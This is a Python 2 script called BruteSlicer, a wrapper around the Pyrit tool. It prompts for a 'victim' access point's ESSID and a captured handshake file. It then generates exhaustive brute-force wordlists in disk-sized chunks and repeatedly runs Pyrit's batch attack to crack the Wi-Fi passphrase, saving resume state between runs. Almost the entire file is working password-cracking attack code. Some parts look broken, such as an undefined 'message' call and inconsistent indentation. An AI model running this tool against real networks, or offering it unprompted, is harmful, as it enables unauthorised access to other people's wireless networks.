#!/usr/bin python
# -*- coding: utf-8 -*-

import itertools
import datetime
import os
import subprocess
import sys
import re

def messages(mess,type) : 
	if type == 'inf':
		print ('\033[1;34m [*] ' + '\033[0;0m' + mess)
	elif type == 'exc' :
		print ('\033[1;31m [!] ' + '\033[0;0m' + mess)
	elif type == 'pos' :
		print ('\033[1;32m [+] ' + '\033[0;0m' + mess)
	elif type == 'neg' :
		print ('\033[1;30m [-] ' + '\033[0;0m' + mess)

def sizeCalculation(funcSizeMax,*funcCharList):
	messages("Calculation of max space allowed for working files...","inf")
	#Calculation for maximum wordlist size
	wlSize = funcSizeMax/3.1
	wlSize = int(wlSize)
	wlSize = (wlSize/3)*2
	#Testing if there is characters weighting more than one byte
	for x in funcCharList[0] :
        	try : 
                	ord(x)
        	except Exception as e : 
                	messages("Current charset includes characters weighting more than one byte. Max size allowed for wordlist is reduced to prevent oversize on disk.","exc")
                	wlSize = wlSize/3
               		break

	wlSize = wlSize/(passlength+1)
	return wlSize

def cleanDBFile():
	cmd = ['ls','.']
        cmdRes = subprocess.check_output(cmd)
        if cmdRes.find("Bslicing.db") != -1 :
                messages("Removing old sqlite Database.","inf")
                os.remove("Bslicing.db")

def pyritRoutine(funcEssid, funcCapFile, funcDico):
	cleanDBFile()
	messages("Importing passwords from wordlist to pyrit's database.","inf")
	cmd = ['pyrit','-u','sqlite:///Bslicing.db','-i',funcDico,'import_passwords']
	cmdRes = subprocess.check_output(cmd)
	if cmdRes.find("All done") != -1 :
		messages("Removing wordlist from disk","inf")
		os.remove(funcDico)
		messages("Applying ESSID to pyrit's database.","inf")
		cmd = ['pyrit','-u','sqlite:///Bslicing.db','-e',funcEssid,'create_essid']
		cmdRes = subprocess.check_output(cmd)
		if cmdRes.find("Created ESSID") != -1:
			messages("Launching pyrit's database batch.","inf")
			cmd = ['pyrit','-u','sqlite:///Bslicing.db','batch']
			cmdRes = subprocess.check_output(cmd)
			if cmdRes.find("Batchprocessing done.") != -1 :
				messages("Launching pyrit's attack with batched database.","inf")
				cmd = ['pyrit','-u','sqlite:///Bslicing.db','-r',funcCapFile,'--all-handshakes','attack_batch']
				try: 
					cmdRes = subprocess.check_output(cmd, stderr=subprocess.STDOUT)
					passwd = re.search(r'The password is \'(.*)\'.',cmdRes).group()
					messages("Password FOUND! " + passwd + "\n","pos")
					cleanDBFile()
					sys.exit(0)
				except Exception as e :
					messages("No password found in this iteration.\n","neg")
			else:
				messages("There is a problem with pyrit command \'batch\'... Please check pyrit works separately and try again.","exc")
				cleanDBFile()
				sys.exit(1)
		else:
			messages("There is a problem with pyrit command '\create_essid\'... Please check pyrit works separately and try again.","exc")
                	cleanDBFile()
			sys.exit(1)
	else: 
		messages("There is a problem with pyrit command '\import_passwords\'... Please check pyrit works separately and try again.","exc")
		cleanDBFile()
		sys.exit(1)

def check_hardware():
	messages("Checking hardware...","inf")
	cmd = ['pyrit','list_cores']
	cmdRes = subprocess.check_output(cmd)
	print cmdRes + '\n'

	messages("Benchmarking cores...","inf")
	cmd = ['pyrit','benchmark']
	cmdRes = subprocess.check_output(cmd)
	print cmdRes + '\n'

######## Constants
charset = 'a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 0 1 2 3 4 5 6 7 8 9 [ \\ ] ^ - ! " $ % & \' ( ) * + , _ . / : ; < = > ? @ ` { } |'
charslist = charset.split(' ')
lx = 0
endOfList = 0
sLoad = ''

######## Banner
banner = """______            _       _____ _ _
| ___ \          | |     /  ___| (_)                    ___
| |_/ /_ __ _   _| |_ ___\ `--.| |_  ___ ___ _ __    ,.  |_'.
| ___ \ '__| | | | __/ _ \`--. \ | |/ __/ _ \ '__|  / /  /:\ \\
| |_/ / |  | |_| | ||  __/\__/ / | | (_|  __/ |    /_/__/::| |
\____/|_|   \__,_|\__\___\____/|_|_|\___\___|_|  /o_'_/o>::/ /
                                                 / / '/:::/ /
A Pyrit Wrapper by Clement Maillioux.           / /__/::.'_/
			                       / /  \__.-'
                                   v 0.11     / /
                                               /"""


print banner

######## Variables
try : 
	optResume = str(raw_input("\033[1;36m [?]" + "\033[0;0m Resume from a previously stopped Bruteslicing ? (y/n) : "))
	while optResume != "n" and optResume != "y" and optResume != "N" and optResume != "Y" :
		optResume = str(raw_input("\033[1;36m [?]" + "\033[0;0m Resume from a previously stopped Bruteslicing ? (y/n) : "))
	if optResume == "n" or optResume == "N" :
		sizeInput = 0

		baseEssid = str(raw_input("\033[1;36m [?]" + "\033[0;0m ESSID of the victim Access Point : "))
                resumeParams = open("tool2.resume","w")
                resumeParams.write(str(baseEssid)+";")
                resumeParams.close()

		try:
                        passlength = int(raw_input("\033[1;36m [?]" + "\033[0;0m Requested length of passphrase to Bruteslice : "))
                        resumeParams = open("tool2.resume","a")
                        resumeParams.write(str(passlength)+";")
                        resumeParams.close()
                except :
                        message("Wrong value. Numbers expected.","exc")
                        sys.exit(1)

		capFile = str(raw_input("\033[1;36m [?]" + "\033[0;0m .cap Filename to use (Should be in the same folder than \"" + os.path.basename(__file__) + ")\". Type \"xxxxxx.cap\" : "))
		resumeParams = open("tool2.resume","a")
                resumeParams.write(str(capFile)+";")
                resumeParams.close()

		try : 
		        sizeInput = int(raw_input("\033[1;36m [?]" + "\033[0;0m Max space allowed on disk for bruteforcing operations (in Mb) : "))
			resumeParams = open("tool2.resume","a")
			resumeParams.write(str(sizeInput)+";")
			resumeParams.close()
		except : 
		        messages("Wrong value. Numbers expected.","exc")
		        sys.exit(1)
		sizeMax = sizeInput * 1000000

		nomfichier = str(raw_input("\033[1;36m [?]" + "\033[0;0m Name of the generated wordlist : "))
		resumeParams = open("tool2.resume","a")
		resumeParams.write(nomfichier)
		resumeParams.close()

		resumefile = open("tool1.resume","w")
	        resumefile.write('1;0')
        	resumefile.close()

	elif optResume == "y" or optResume == "Y" :
		resumeParams = open("tool2.resume","r")
		tmpParams = resumeParams.read()
		resumeParams.close()
		tmpParams = tmpParams.split(';')
		baseEssid = str(tmpParams[0])
		capFile = str(tmpParams[2])
		sizeInput = int(tmpParams[3])
		sizeMax = sizeInput * 1000000
		passlength = int(tmpParams[1])
		nomfichier = str(tmpParams[4])
		del tmpParams
		messages("Resuming with the following parameters : \n - Victim AP ESSID : " + str(baseEssid) + "\n - Password length to bruteforce : " + str(passlength) + "\n - Captured .cap filename : " + str(capFile) + "\n - Max workspace allowed on disk in Mb : " + str(sizeInput) + "\n - Dictionnary name : " + nomfichier + "\n","pos")

except : 
	messages("Wrong value or \'tool1.resume\' file not present on disk","exc")
	sys.exit(1)


endingString = charslist[int(len(charslist)-1)]*passlength

resumefile = open("tool1.resume","r")
resumeValues = resumefile.read()
resumefile.close()
resumeValues = resumeValues.split(';')
iteration = int(resumeValues[0])
startLine = int(resumeValues[1])

res = itertools.islice(itertools.product(charslist,repeat=passlength),startLine,None)
fichier = open(nomfichier,"w")
fichier.write('')
fichier.close()

#check_hardware()

lLimit = sizeCalculation(sizeMax,charslist)

while endOfList != 1 :
	sLoad = ""
	resumefile = open("tool1.resume","r")
	resumeValues = resumefile.read()
	resumefile.close()
	resumeValues = resumeValues.split(';')
	iteration = int(resumeValues[0])
	startLine = int(resumeValues[1])

	fichier = open(nomfichier,"w") 

	messages("Starting iteration " + str(iteration) + " at " + str(datetime.datetime.now())[:19],'inf')

	for item in res:
		sLoad = sLoad + str((''.join(item)+'\n'))

		if (lx >= lLimit) : 
			messages("Stopping iteration " + str(iteration) + " on " + str(datetime.datetime.now())[:19] + " at "  + ''.join(item) + " because requested filesize is reached.","inf")
			fichier.write(sLoad)
			del sLoad
			messages("File written, ready for injection in Pyrit.","inf")
			startLine = lx*iteration			
			iteration += 1
			lx=0
			pyritRoutine(baseEssid,capFile,nomfichier)
			resumefile = open("tool1.resume","w")
			resumefile.write(str(iteration) + ";" + str(startLine))
			resumefile.close()
			fichier.close()
			break

		if str(''.join(item)) == endingString :
			endOfList = 1
		lx += 1
del res
del sLoad
messages("Finished last iteration with no results",'inf')

